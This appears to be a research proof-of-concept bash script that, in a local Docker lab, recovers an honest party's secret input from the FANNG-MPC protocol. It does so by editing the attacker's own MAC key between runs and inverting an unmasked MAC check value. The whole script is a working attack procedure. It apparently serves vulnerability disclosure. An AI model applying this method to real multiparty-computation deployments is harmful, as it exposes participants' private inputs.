#!/usr/bin/env bash
# Cross-run MAC-key-inconsistency STRONGER attack on FANNG-MPC Full Threshold:
# FULL INPUT RECOVERY in a single run. Same attack as
# ../scale-mamba/run-recovery.sh (FANNG is a SCALE-MAMBA fork); see README.md.
#
# run-attack.sh is the selective-failure variant (guess y, learn one bit from
# complete-vs-abort). This script is the stronger attack. FANNG inherits
# SCALE-MAMBA's *unmasked* Damgard et al. (2013) MAC check: every party commits
# to and opens its own check share, so the opened value of a masked opening
# d = y - b is exactly (alpha+1)*d - m_d = g - y. The attacker reads y outright
# -- no guessing -- even though the run then aborts and the opened value d is
# uniform and reveals nothing on its own.
#
# The only adversarial action between runs is the single edit to Player 1's own
# Data/MKey-1.key (alpha_1 += 1). No MAC-tag edit and no guess. The attacker
# (Player 1) runs the SAME binary as the honest party; it merely sets
# OFFKEY_RECOVER=1 so its own process inverts the value it already holds.
#
# Prerequisite: a running FANNG container named `fanng` with the repo at /fanng,
# built via the Crypto-TII/FANNG-MPC docker harness:
#     docker/run.sh build && docker/run.sh up && docker/run.sh progs
# This script then applies patches/offkey_recover.py to the mounted source and
# REBUILDS the runtime once (the recovery instrumentation is a source change,
# unlike the selective-failure PoC which needs no rebuild).
#
# Usage: ./run-recovery.sh [secret]
#   ./run-recovery.sh 12345       # attacker recovers y = 12345 in one run
#   FAKE=1 ./run-recovery.sh 42   # fast, low-memory trusted-dealer offline
set -euo pipefail
cd "$(dirname "$0")"

SECRET="${1:-12345}"
CONTAINER=fanng
FAKE="${FAKE:-0}"
ARCH_NOAVX='-maes -mpclmul -msse4.1 -march=core2 -mtune=generic'

if ! docker ps --format '{{.Names}}' | grep -qx "$CONTAINER"; then
  echo "error: container '$CONTAINER' is not running."
  echo "Build FANNG first via its docker harness (in the FANNG-MPC repo):"
  echo "    docker/run.sh build && docker/run.sh up && docker/run.sh progs"
  exit 1
fi

echo "=== FANNG-MPC cross-run input-recovery attack (unmasked check, Sec 4.4) ==="
echo "Honest party's secret: y = $SECRET   (known only to the honest party)"
echo "The attacker recovers y in a single run -- no guessing."
[ "$FAKE" = 1 ] && echo "Offline: trusted-dealer (FAKE=1) + -dOT  (fast, low memory)" \
                || echo "Offline: FHE/BGV (real, default) + -dOT  (needs native x86, >= 32 GB RAM; FAKE=1 for fast low-memory run)"
echo

# The FANNG image ships only python2, but the source patcher and the
# between-runs patcher.py need python3 in-container; install it once if missing.
docker exec "$CONTAINER" bash -lc 'command -v python3 >/dev/null 2>&1 || (apt-get update -qq && apt-get install -y -qq python3)' >/dev/null 2>&1 \
  || { echo 'error: could not ensure python3 in the container'; exit 1; }

# Install variant 18, sync the recovery instrumentation + programs + poc scripts.
docker exec "$CONTAINER" bash -lc 'cp Auto-Test-Data/18/* Data/ && cp Auto-Test-Data/Cert-Store/* Cert-Store/ && mkdir -p /fanng/poc /fanng/poc/patches /fanng/Programs/attack_store /fanng/Programs/attack_recover' >/dev/null
docker cp poc.sh                 "$CONTAINER":/fanng/poc/poc.sh     >/dev/null
docker cp patcher.py             "$CONTAINER":/fanng/poc/patcher.py >/dev/null
docker cp patches/offkey_recover.py "$CONTAINER":/fanng/poc/patches/offkey_recover.py >/dev/null
docker cp Programs/attack_store/attack_store.mpc     "$CONTAINER":/fanng/Programs/attack_store/attack_store.mpc     >/dev/null
docker cp Programs/attack_recover/attack_recover.mpc "$CONTAINER":/fanng/Programs/attack_recover/attack_recover.mpc >/dev/null

echo "--- Applying recovery instrumentation and rebuilding the runtime (once) ---"
# Idempotent: skips if the mounted source is already instrumented.
docker exec "$CONTAINER" bash -lc 'python3 /fanng/poc/patches/offkey_recover.py /fanng/src/LSSS/Open_Protocol.cpp'
docker exec "$CONTAINER" bash -lc "make -C src ARCH='$ARCH_NOAVX' -j\$(nproc) 2>&1 | tail -2" \
  || { echo 'error: runtime rebuild failed'; exit 1; }
docker exec "$CONTAINER" bash -lc './compile-new.sh Programs/attack_store >/dev/null 2>&1 && ./compile-new.sh Programs/attack_recover >/dev/null 2>&1' \
  || { echo 'error: failed to compile the attack programs'; exit 1; }

poc() { docker exec -e FAKE="$FAKE" -e QUIET=1 "$CONTAINER" bash -lc "bash /fanng/poc/poc.sh $*"; }

echo
echo "--- Run 1: honest party stores its secret (authenticated under MAC key alpha) ---"
poc store "$SECRET"

echo
echo "--- Run 2: attacker restarts (alpha_1 += 1) and inverts the unmasked check ---"
out="$(poc recover 0)"
echo "$out" | sed 's/^/  /'
REC="$(printf '%s\n' "$out" | sed -n 's/.*RECOVERED_Y=\([0-9-]*\).*/\1/p' | head -1)"

echo
echo "=== RESULT ==="
if [ -n "$REC" ]; then
  echo "Attacker recovered the honest party's secret: y = $REC"
  if [ "$REC" = "$SECRET" ]; then
    echo "(matches the true secret $SECRET -- recovered in a single run)"
  else
    echo "(true secret was $SECRET; recovered value differs -- inspect logs)"
  fi
else
  echo "No recovery line found; inspect the run output above."
  exit 1
fi
echo
echo "The opened value d = y - b was uniform and leaked nothing on its own; the"
echo "secret leaked through the *unmasked* check value, which the attacker inverts"
echo "before the abort. The honest party (P0) ran the same binary with no"
echo "environment flags; only P1's own MKey-1.key was edited between the runs."
